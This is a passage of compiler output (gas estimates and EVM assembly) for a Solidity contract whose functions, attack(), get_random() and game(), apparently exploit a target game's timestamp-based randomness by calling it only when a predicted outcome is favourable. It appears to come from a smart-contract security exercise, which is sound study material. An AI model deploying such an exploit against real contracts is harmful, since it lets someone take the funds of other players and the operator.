								"codeDepositCost": "130600",
								"executionCost": "40954",
								"totalCost": "171554"
							},
							"external": {
								"": "129",
								"attack()": "infinite",
								"game()": "486",
								"get_random()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 643,
									"end": 1201,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "MSTORE"
								},
								{
									"begin": 695,
									"end": 737,
									"name": "PUSH",
									"value": "5B38DA6A701C568545DCFCB03FCB875F56BEDDC4"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "DUP1"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "EXP"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "DUP2"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "SLOAD"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "DUP2"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "MUL"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "NOT"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "AND"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "SWAP1"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "DUP4"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "AND"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "MUL"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "OR"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "SWAP1"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "SSTORE"
								},
								{
									"begin": 673,
									"end": 737,
									"name": "POP"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "DUP1"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "SWAP1"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "SLOAD"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "SWAP1"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "EXP"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "SWAP1"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "DIV"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 785,
									"end": 789,
									"name": "AND"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "EXP"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "DUP2"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "SLOAD"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "DUP2"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "MUL"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "NOT"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "AND"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "SWAP1"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "DUP4"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "AND"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "MUL"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "OR"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "SWAP1"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "SSTORE"
								},
								{
									"begin": 744,
									"end": 790,
									"name": "POP"
								},
								{
									"begin": 1184,
									"end": 1191,
									"name": "PUSH",
									"value": "DE0B6B3A7640000"
								},
								{
									"begin": 1171,
									"end": 1180,
									"name": "CALLVALUE"
								},
								{
									"begin": 1171,
									"end": 1191,
									"name": "LT"
								},
								{
									"begin": 1171,
									"end": 1191,
									"name": "ISZERO"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "ISZERO"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "ISZERO"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "PUSH [tag]",
									"value": "3"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "JUMPI"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "DUP1"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "REVERT"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "tag",
									"value": "3"
								},
								{
									"begin": 1163,
									"end": 1192,
									"name": "JUMPDEST"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "DUP1"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "CODECOPY"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 643,
									"end": 1201,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a165627a7a7230582059129c5a061551ba94e2795656cab979c82ef12a8168d6eb6ad2598f697730cf0029",
									".code": [
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "MSTORE"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "LT"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "JUMPI"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "SWAP1"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "DIV"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "AND"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "DUP1"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "98107E5B"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "EQ"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "JUMPI"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "DUP1"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "9E5FAAFC"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "EQ"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "JUMPI"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "DUP1"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH",
											"value": "C3FE3E28"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "EQ"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "JUMPI"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "JUMPDEST"
										},
										{
											"begin": 643,
											"end": 1201,
											"name": "STOP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "JUMPDEST"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "POP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "JUMP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "JUMPDEST"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "MLOAD"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "DUP1"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "DUP3"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "DUP2"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "MSTORE"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "ADD"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "SWAP2"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "POP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "POP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "MLOAD"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "DUP1"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "SWAP2"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "SUB"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "SWAP1"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "RETURN"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "JUMPDEST"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "JUMP"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "JUMPDEST"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "STOP"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "JUMPDEST"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "POP"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "JUMP"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "JUMPDEST"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "MLOAD"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DUP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DUP3"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "AND"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "AND"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DUP2"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "MSTORE"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "ADD"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SWAP2"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "POP"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "POP"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "MLOAD"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "DUP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SWAP2"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SUB"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "SWAP1"
										},
										{
											"begin": 673,
											"end": 737,
											"name": "RETURN"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "JUMPDEST"
										},
										{
											"begin": 839,
											"end": 843,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 854,
											"end": 868,
											"name": "DUP1"
										},
										{
											"begin": 898,
											"end": 901,
											"name": "TIMESTAMP"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "MLOAD"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "ADD"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "DUP1"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "DUP3"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "DUP2"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "MSTORE"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "ADD"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "SWAP2"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "POP"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "POP"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "MLOAD"
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2"
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "SWAP1"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 881,
											"end": 902,
											"name": "MSTORE"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "MLOAD"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP3"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "MLOAD"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "ADD"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP4"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP4"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4"
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT"
										},
										{
											"begin": 51,
											"end": 70,
											"name": "ISZERO"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "ISZERO"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI"
										},
										{
											"begin": 182,
											"end": 185,
											"name": "DUP1"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD"
										},
										{
											"begin": 171,
											"end": 174,
											"name": "DUP3"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 93,
											"end": 96,
											"name": "DUP3"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 82,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 82,
											"end": 101,
											"name": "POP"
										},
										{
											"begin": 123,
											"end": 125,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 118,
											"end": 121,
											"name": "DUP2"
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 126,
											"name": "SWAP1"
										},
										{
											"begin": 107,
											"end": 126,
											"name": "POP"
										},
										{
											"begin": 148,
											"end": 150,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 143,
											"end": 146,
											"name": "DUP4"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SUB"
										},
										{
											"begin": 132,
											"end": 151,
											"name": "SWAP3"
										},
										{
											"begin": 132,
											"end": 151,
											"name": "POP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4"
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB"
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP"
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB"
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT"
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3"
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD"
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND"
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2"
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5"
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD"
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1"
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3"
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR"
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6"
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "ADD"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SWAP2"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "MLOAD"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "DUP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SWAP2"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SUB"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "SWAP1"
										},
										{
											"begin": 871,
											"end": 903,
											"name": "KECCAK256"
										},
										{
											"begin": 854,
											"end": 903,
											"name": "SWAP1"
										},
										{
											"begin": 854,
											"end": 903,
											"name": "POP"
										},
										{
											"begin": 935,
											"end": 939,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 925,
											"end": 931,
											"name": "DUP2"
										},
										{
											"begin": 920,
											"end": 932,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 920,
											"end": 932,
											"name": "SWAP1"
										},
										{
											"begin": 920,
											"end": 932,
											"name": "DIV"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "DUP2"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "ISZERO"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "ISZERO"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "JUMPI"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "INVALID"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "JUMPDEST"
										},
										{
											"begin": 920,
											"end": 939,
											"name": "MOD"
										},
										{
											"begin": 913,
											"end": 939,
											"name": "SWAP2"
										},
										{
											"begin": 913,
											"end": 939,
											"name": "POP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "POP"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "SWAP1"
										},
										{
											"begin": 797,
											"end": 946,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 952,
											"end": 1066,
											"name": "JUMPDEST"
										},
										{
											"begin": 1017,
											"end": 1020,
											"name": "PUSH",
											"value": "1F4"
										},
										{
											"begin": 1003,
											"end": 1015,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 1003,
											"end": 1013,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 1003,
											"end": 1015,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1003,
											"end": 1015,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 1003,
											"end": 1015,
											"name": "JUMPDEST"
										},
										{
											"begin": 1003,
											"end": 1020,
											"name": "LT"
										},
										{
											"begin": 1003,
											"end": 1020,
											"name": "ISZERO"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "ISZERO"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "ISZERO"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "JUMPI"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "DUP1"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "REVERT"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 995,
											"end": 1021,
											"name": "JUMPDEST"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "SWAP1"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "SLOAD"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "SWAP1"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "EXP"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "SWAP1"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "DIV"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1031,
											"end": 1043,
											"name": "AND"
										},
										{
											"begin": 1031,
											"end": 1048,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1031,
											"end": 1048,
											"name": "AND"
										},
										{
											"begin": 1031,
											"end": 1048,
											"name": "PUSH",
											"value": "93E84CD9"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "MLOAD"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP2"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "AND"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "MUL"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP2"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "MSTORE"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "ADD"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "MLOAD"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP1"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP4"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "SUB"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP2"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP8"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "DUP1"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 1031,
											"end": 1050,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
